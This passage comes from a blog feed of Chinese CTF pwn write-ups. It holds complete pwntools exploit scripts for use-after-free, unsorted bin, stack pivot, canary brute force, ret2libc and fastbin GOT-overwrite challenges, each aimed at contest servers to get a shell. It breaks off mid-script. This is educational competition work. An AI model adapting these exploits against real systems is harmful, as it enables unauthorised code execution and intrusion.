class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;passwd:&#x27;</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h2>\n<p>Use After Free 漏洞<br />\n指针 free 之后没有置空，下次在访问该指针时能访问到原指针所指向的堆内容<br />\n添加两个 note 之后，依次释放。再创建大小为 8 的 note 时，内容部分对应被分配到第一个 note 里面，而它的指针没有置空，<br />\n所以如果我们在新的 note 里面放后门函数的地址的话，print 新 note 的内容的时候，就会执行这个后门函数<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(b&#x27;./pwn5&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;219.219.61.234&#x27;</span>,<span class=\"number\">10000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">backdoor=<span class=\"number\">0x08048986</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">add(<span class=\"number\">32</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(backdoor))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"pwn6\"><a class=\"anchor\" href=\"#pwn6\">#</a> pwn6</h2>\n<p>堆溢出漏洞 + unsorted bin attack<br />\n 只要控制 v3=4869，同时控制 qword_6020C0 大于 0x1305，就可以了<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682436089/Typera/2023/04/d1aaf56f4760a578927720faa790c02a.png\" alt=\"image-20230425232125920\" /><br />\n 观察到 v3=2 对应的函数里面有堆溢出漏洞，所以可以利用堆溢出漏洞修改堆块的 bk 指针为 qword_6020C0 的地址 - 16</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./pwn6&#x27;)</span></span><br><span class=\"line\">r = remote(<span class=\"string\">&quot;219.219.61.234&quot;</span>,<span class=\"number\">10001</span> )</span><br><span class=\"line\">elf=ELF(<span class=\"string\">B&#x27;./pwn6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">&#x27;bbbb&#x27;</span>)</span><br><span class=\"line\">create(<span class=\"number\">0x20</span>,<span class=\"string\">&#x27;cccc&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x6020C0</span></span><br><span class=\"line\">fd = <span class=\"number\">0</span></span><br><span class=\"line\">bk = magic -<span class=\"number\">0x10</span></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x91</span>) + p64(fd) + p64(bk)) </span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;:&#x27;</span>)</span><br><span class=\"line\">r.sendline(<span class=\"string\">b&#x27;4869&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "Python",
                "CTF",
                "Pwn"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "url": "https://www.sycamore.top/CyberSecurity/CTF/CUMTCTF-2021%E5%9B%BD%E5%BA%86%E8%B5%9BWP%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/",
            "title": "CUMTCTF 2021国庆赛WP（部分）",
            "date_published": "2021-11-22T15:44:13.000Z",
            "content_html": "<h2 id=\"pwn\"><a class=\"anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h3>\n<p>nc 连上 直接 cat flag</p>\n<h3 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h3>\n<p>经典栈溢出<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435298/Typera/2023/04/2d25d53292a7b5602fd11b9e1127bcf1.png\" alt=\"image-20230425230815230\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn2&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">10001</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">72</span> + p64(<span class=\"number\">0x400596</span>)</span><br><span class=\"line\">r.sendline(p)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>直接传就行了...</p>\n<h3 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h3>\n<p>开了 NX 保护，没开金丝雀</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435393/Typera/2023/04/0ac847eebeec27d62e811700f99b5b71.png\" alt=\"image-20230425230949625\" /> 有个 echo flag，感觉像是那么回事，实际上没用，</p>\n<p>所以还是得通过 system 函数来搞</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435314/Typera/2023/04/b3a274b13eede296b71c54165bc95d53.png\" alt=\"image-20230425230831039\" /></p>\n<p>这里 s 大小是 0x28，所以只能溢出 0x8 字节，不够写太长的，但是这里可以读两次，所以思路是第一次泄露 ebp 地址，第二次写入 system (‘/bin/sh’)，然后用 leave;ret 栈劫持 s，执行 system ('/bin/sh')</p>\n<p>要劫持 s 要知道 s 的地址，可以通过动调知道 ebp 到 s 的距离，然后计算</p>\n<p>ebp 到 s 的距离为 0xffffc1f8 - 0xffffc1c0 = 0x38</p>\n<p>所以 ebp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">ebp = u32(r.recv(<span class=\"number\">4</span>))</span><br></pre></td></tr></table></figure></p>\n<p>可以得到 ebp 的地址，然后 - 0x38 得到 s</p>\n<p>完整 exp:</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./pwn3&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#r=remote(&#x27;1.15.81.218&#x27;,10002)</span></span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x08048562</span></span><br><span class=\"line\">main_addr=<span class=\"number\">0xdeadbeef</span></span><br><span class=\"line\"></span><br><span class=\"line\">p=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x27</span>+<span class=\"string\">b&#x27;b&#x27;</span></span><br><span class=\"line\">r.send(p)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">s_addr=ebp=u32(r.recv(<span class=\"number\">4</span>))-<span class=\"number\">0x38</span>  <span class=\"comment\"># ebp-s=0x38</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p2=<span class=\"string\">b&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(main_addr)+p32(s_addr+<span class=\"number\">0x10</span>)+<span class=\"string\">b&quot;/bin/sh&quot;</span></span><br><span class=\"line\">p2=p2.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)  <span class=\"comment\"># /bin/sh添上\\x00</span></span><br><span class=\"line\">p2+=p32(s_addr)+p32(leave_ret)  <span class=\"comment\"># hijack s</span></span><br><span class=\"line\">r.send(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"brute\"><a class=\"anchor\" href=\"#brute\">#</a> brute?</h3>\n<p>brute canary, 暴力破解金丝雀<br />\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">    <span class=\"keyword\">global</span> canary,r</span><br><span class=\"line\">    <span class=\"comment\">#r = process(&#x27;./brute&#x27;)</span></span><br><span class=\"line\">    r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>,<span class=\"number\">20000</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>))</span><br><span class=\"line\">    canary = <span class=\"string\">b&#x27;\\x00&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0x100</span>):</span><br><span class=\"line\">            r.send(<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">100</span> + canary + <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode()))</span><br><span class=\"line\">            a = r.recvuntil(<span class=\"string\">b&#x27;2021!\\n&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;Successfully&#x27;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">                canary += <span class=\"built_in\">bytes</span>(<span class=\"built_in\">chr</span>(i).encode())</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">len</span>(canary)!=<span class=\"number\">4</span>):</span><br><span class=\"line\">        find()</span><br><span class=\"line\"></span><br><span class=\"line\">find()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(canary)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./brute&#x27;</span>)</span><br><span class=\"line\">system = elf.plt[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x08048560</span></span><br><span class=\"line\">p1 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class=\"line\"><span class=\"comment\">#print(r.recvuntil(b&#x27;2021!\\n&#x27;))</span></span><br><span class=\"line\">r.sendline(p1)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_addr = u32(r.recv()[<span class=\"number\">0</span>:<span class=\"number\">4</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;puts_addr:&#x27;</span>,puts_addr)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class=\"line\">base = puts_addr - libc.dump(<span class=\"string\">&#x27;puts&#x27;</span>)</span><br><span class=\"line\">sys_addr = base + libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">bin_sh = base + libc.dump(<span class=\"string\">&#x27;str_bin_sh&#x27;</span>)</span><br><span class=\"line\">p2 = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">100</span> + canary +<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12</span>+ p32(sys_addr) +  <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">4</span> + p32(bin_sh)</span><br><span class=\"line\">r.sendline(p2)</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure><br />\n 爆破好慢...<br />\nCUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5</p>\n<h3 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h3>\n<p>edit 的地方有个堆溢出漏洞</p>\n<p>l33t 是后门函数，想要触发需要使位于 bss 的 (unsigned __int64) magic &gt; 0x1305</p>\n<p>unsorted bin attack，修改 magic 的值为 unsorted bin 的地址，可以使 magic &gt; 0x1305</p>\n<p>...</p>\n<p>被坑了。。。</p>\n<p>竟然不是这个目录。。。。。。。。。。。</p>\n<p>然后打算修改一下 system 指令的字符串，发现这个字符串被存在 rodata，只读</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682435338/Typera/2023/04/4c2f5f1d77fee1973ed990605f1b4cee.png\" alt=\"image-20230425230855187\" /></p>\n<p>只能重新搞</p>\n<p>想办法控制 heaparray，</p>\n<p>用 fake chunk 修改 heaparray [0] 为 free_got 的地址，然后用 edit () 修改 free_got 为 system 的地址</p>\n<p>接下来就 free 掉一个存了 /bin/sh\\x00 的 chunk，这样就可以 getshell 了，这个可以事先创建好这样的一个 chunk 来实现，然后用 delete_heap 调用 free</p>\n<p>fake chunk 的话，可以再搞两个 chunk，free 第一个 chunk，然后修改另一个造成堆溢出来修改第一个 chunk 的 fd 指针，使其指向 fake chunk</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#r=process(&quot;./pwn4&quot;)</span></span><br><span class=\"line\">r=remote(<span class=\"string\">&#x27;1.15.81.218&#x27;</span>, <span class=\"number\">10003</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">heaparray=<span class=\"number\">0x006020E0</span></span><br><span class=\"line\">fake_fastbin=<span class=\"number\">0x6020ad</span></span><br><span class=\"line\">system_addr=<span class=\"number\">0x400C2C</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&quot;free&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap:&quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;SuccessFul&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Your choice :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Index :&quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Size of Heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Content of heap : &quot;</span>)</span><br><span class=\"line\">    r.sendline(content)</span><br><span class=\"line\">    r.recvuntil(<span class=\"string\">&quot;Done !&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx0</span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  </span></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;b&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx2 </span></span><br><span class=\"line\">create(<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\"># id3 </span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0x10</span> * <span class=\"string\">b&#x27;a&#x27;</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x71</span>) + p64(<span class=\"number\">0x6020ad</span>) + p64(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">create(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;d&#x27;</span> * <span class=\"number\">0x10</span>)  <span class=\"comment\"># idx1  